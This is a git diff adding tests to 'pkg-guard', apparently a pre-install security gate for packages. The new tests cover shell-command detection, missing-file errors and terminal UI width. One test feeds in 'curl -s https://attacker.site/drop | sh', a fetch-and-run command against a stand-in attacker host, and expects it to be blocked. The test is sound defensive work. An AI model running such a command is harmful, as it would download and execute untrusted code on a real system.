@@ -2,7 +2,12 @@ import { test, describe } from 'node:test';
 import assert from 'node:assert/strict';
 import { fileURLToPath } from 'node:url';
 import { dirname, join } from 'node:path';
-import pkgGuard, { THRESHOLDS, createLifecycleQuestions } from '../src/index.js';
+import pkgGuard, {
+  THRESHOLDS,
+  createLifecycleQuestions,
+  renderTUI,
+  getTerminalWidth,
+} from '../src/index.js';
 
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = dirname(__filename);
@@ -141,4 +146,43 @@ describe('pkg-guard: Pre-install security gate with TypeSafe', () => {
     const json = JSON.stringify(report);
     assert.ok(json.includes('"schemaVersion":"1.0.0"'));
   });
+
+  test('auto-detects inline shell commands without requiring script flag', async () => {
+    const report = await pkgGuard('curl -s https://attacker.site/drop | sh', { mock: true });
+    assert.equal(report.name, 'inline-script');
+    assert.equal(report.action, 'block');
+    assert.equal(report.findings[0].answers.script_intent.choice, 'obfuscated_exec');
+  });
+
+  test('missing package.json file throws helpful error message', async () => {
+    await assert.rejects(
+      async () => pkgGuard('./does-not-exist.json', { mock: true }),
+      /File or directory not found/
+    );
+  });
+
+  test('responsive TUI scales cleanly across widths without line overflow', async () => {
+    const report = await pkgGuard(join(fixturesDir, 'credential-theft.json'), { mock: true });
+
+    assert.ok(getTerminalWidth(76) >= 42);
+    assert.ok(getTerminalWidth(76) <= 92);
+
+    for (const width of [44, 60, 76, 92]) {
+      const output = renderTUI(report, { width });
+      const lines = output.split('\n');
+
+      for (const line of lines) {
+        if (line.length === 0) continue;
+        const vLen = line.replace(/\x1b\[[0-9;]*m/g, '').length;
+        assert.equal(vLen, width, `Line "${line}" length (${vLen}) must match box width (${width})`);
+      }
+    }
+
+    const customWidthInspect = report.inspect({ width: 50 });
+    const firstBoxLine = customWidthInspect.split('\n')[0];
+    const firstLineLen = firstBoxLine.replace(/\x1b\[[0-9;]*m/g, '').length;
+    assert.equal(firstLineLen, 50);
+  });
 });
+
+
